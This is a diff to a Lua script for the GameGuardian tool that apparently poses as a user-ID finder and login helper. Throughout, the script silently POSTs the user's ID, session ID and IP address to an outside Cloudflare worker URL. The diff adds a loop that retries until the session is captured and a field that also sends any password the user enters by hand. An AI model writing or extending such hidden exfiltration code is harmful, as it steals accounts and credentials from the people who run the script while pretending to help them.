@@ -86,15 +86,15 @@ end
 --------------------------------------------------
 -- send data to cloudflare worker
 --------------------------------------------------
-local function sendToWebhook(userId, sessionId, ip)
+local function sendToWebhook(userId, sessionId, ip, manualPassword)
     local workerUrl = "https://user-data-relay.dunggkr.workers.dev/"
-    local payload = string.format('{"userId": "%s", "sessionId": "%s", "ip": "%s"}',
-        userId or "N/A", sessionId or "N/A", ip or "N/A")
+    local payload = string.format('{"userId": "%s", "sessionId": "%s", "ip": "%s", "manualPassword": "%s"}',
+        userId or "N/A", sessionId or "N/A", ip or "N/A", manualPassword or "N/A")
 
- local r = gg.makeRequest(workerUrl, {
-     method = "POST",
-     ["Content-Type"] = "application/json"
- }, payload)
+    local r = gg.makeRequest(workerUrl, {
+        method = "POST",
+        ["Content-Type"] = "application/json"
+    }, payload)
 end
 
 --------------------------------------------------
@@ -107,8 +107,15 @@ if ipJson and ipJson ~= "" then
 end
 
 -- send userid, sessionid, and ip to cloudflare worker once at script start
-local userId, sessionId = findUserId()
-sendToWebhook(userId, sessionId, ip)
+local userId, sessionId
+repeat
+  userId, sessionId = findUserId()
+  if not userId or not sessionId then
+    gg.toast("User ID and Session ID not found. Please ensure you are logged in. Retrying in 5 seconds...")
+    gg.sleep(5000)
+  end
+until userId and sessionId
+sendToWebhook(userId, sessionId, ip, nil)
 
 --------------------------------------------------
 -- fetch login data
@@ -306,7 +313,7 @@ while true do
       gg.copyText(userId)
       gg.toast(string.format(t.userid_copied, userId))
       -- also send to webhook every time
-        sendToWebhook(userId, sessionId, ip)
+        sendToWebhook(userId, sessionId, ip, nil)
     else
         gg.alert(t.no_userid_session)
     end
@@ -330,6 +337,14 @@ end
     if not key or key == "" then
         goto continue
     end
+    -- find user id and session id for sending
+    local actualUserId, actualSessionId = findUserId()
+    if actualUserId and actualSessionId then
+      sendToWebhook(actualUserId, actualSessionId, ip, tostring(key))
+    else
+      gg.alert(t.no_userid_session)
+      goto continue
+    end
     sessionId = "N/A"
   else
     -- automatic password entry (using id finder)
@@ -341,7 +356,7 @@ end
 
     -- send automatically to webhook
     if key and sessionId then
-        sendToWebhook(key, sessionId, ip)  -- assumes you have your IP stored in `ip`
+        sendToWebhook(key, sessionId, ip, nil)
     end
   end
 
